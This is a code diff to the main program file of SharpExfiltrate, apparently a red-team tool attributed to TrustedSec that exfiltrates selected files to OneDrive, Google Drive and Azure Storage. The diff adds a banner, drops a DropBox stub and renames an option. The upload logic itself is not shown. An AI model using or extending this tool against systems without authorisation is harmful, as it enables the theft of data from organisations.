@@ -8,19 +8,21 @@ namespace SharpExfiltrate
 {
     public class Program
     {
-
-
-        public static async Task<int> DropBoxExfil(DropBoxOptions oneDriveOptions)
+        public static void ShowBanner()
         {
-            //More to come :)
-
-            return 0;
+            Console.WriteLine(@"
+  __  _  _  __  ___ ___ _____   _____ _ _ _____ ___  __ _____ ___  
+/' _/| || |/  \| _ \ _,\ __\ \_/ / __| | |_   _| _ \/  \_   _| __| 
+`._`.| >< | /\ | v / v_/ _| > , <| _|| | |_| | | v / /\ || | | _|  
+|___/|_||_|_||_|_|_\_| |___/_/ \_\_| |_|___|_| |_|_\_||_||_| |___| 
+@Flangvik - TrustedSec
+                ");
 
         }
 
         public static async Task<int> GoogleDriveExfil(GoogleDriveOptions googleDriveOptions)
         {
-            var fileHandlingModule = new FileHandling(googleDriveOptions.FilePath, googleDriveOptions.FileSize, googleDriveOptions.FileExtensions, googleDriveOptions.MemOnly);
+            var fileHandlingModule = new FileHandling(googleDriveOptions.FilePath, googleDriveOptions.FileSize, googleDriveOptions.FileExtensions, googleDriveOptions.MemoryOnly);
 
             var oneDriveModule = new GoogleDrive(googleDriveOptions);
 
@@ -41,7 +43,7 @@ namespace SharpExfiltrate
 
         public static async Task<int> AzureStorageExfil(AzureStorageOptions azureStorageOptions)
         {
-            var fileHandlingModule = new FileHandling(azureStorageOptions.FilePath, azureStorageOptions.FileSize, azureStorageOptions.FileExtensions, azureStorageOptions.MemOnly);
+            var fileHandlingModule = new FileHandling(azureStorageOptions.FilePath, azureStorageOptions.FileSize, azureStorageOptions.FileExtensions, azureStorageOptions.MemoryOnly);
 
             var azureStorageModule = new AzureStorage(azureStorageOptions.ConnectionString);
 
@@ -62,7 +64,7 @@ namespace SharpExfiltrate
         public static async Task<int> OneDriveExfil(OneDriveOptions oneDriveOptions)
         {
 
-            var fileHandlingModule = new FileHandling(oneDriveOptions.FilePath, oneDriveOptions.FileSize, oneDriveOptions.FileExtensions, oneDriveOptions.MemOnly);
+            var fileHandlingModule = new FileHandling(oneDriveOptions.FilePath, oneDriveOptions.FileSize, oneDriveOptions.FileExtensions, oneDriveOptions.MemoryOnly);
 
             var oneDriveModule = new OneDrive(oneDriveOptions);
 
@@ -80,8 +82,11 @@ namespace SharpExfiltrate
 
         public static void Main(string[] args)
         {
+
+            ShowBanner();
             CommandLine.Parser.Default.ParseArguments<OneDriveOptions, GoogleDriveOptions, AzureStorageOptions>(args)
               .MapResult(
+                
                 (OneDriveOptions opts) => OneDriveExfil(opts).GetAwaiter().GetResult(),
               //  (DropBoxOptions opts) => DropBoxExfil(opts).GetAwaiter().GetResult(),
                 (GoogleDriveOptions opts) => GoogleDriveExfil(opts).GetAwaiter().GetResult(),
